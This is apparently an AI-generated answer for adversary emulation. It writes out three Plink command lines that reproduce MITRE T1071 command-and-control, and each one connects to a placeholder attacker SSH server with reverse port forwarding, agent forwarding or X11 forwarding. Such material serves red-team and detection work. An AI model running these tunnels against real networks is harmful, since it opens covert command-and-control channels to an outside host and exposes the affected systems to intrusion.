Based on the provided documentation and attack description, I will generate realistic command lines using only the tool Plink to reproduce the attack behavior.

**Attack Description:** Adversaries may communicate using OSI application layer protocols.

**MITRE Technique and Tactic:** T1071 - APPLICATION LAYER PROTOCOL, TA0011 - COMMAND AND CONTROL

Here are the generated command lines:

Command: `plink.exe -i "<private_key_file>" <attacker_ssh_user>@<server_ip> -R 80:localhost:80`

Command: `plink.exe -C -i "<private_key_file>" <attacker_ssh_user>@<server_ip> -X -A -t -1 -4`

Command: `plink.exe -no-sanitise-stdout -i "<private_key_file>" <attacker_ssh_user>@<server_ip> -R 443:localhost:443 -X -a`

These command lines simulate the use of Plink to communicate using OSI application layer protocols, as described in the attack description. They use various options and parameters documented in the Plink manual, including private key authentication, port forwarding, compression, X11 forwarding, agent forwarding, and protocol version selection.

Please note that I have used placeholders for sensitive information such as private key files, server IP addresses, and attacker SSH user credentials. These must be replaced with actual values specific to the lab environment.
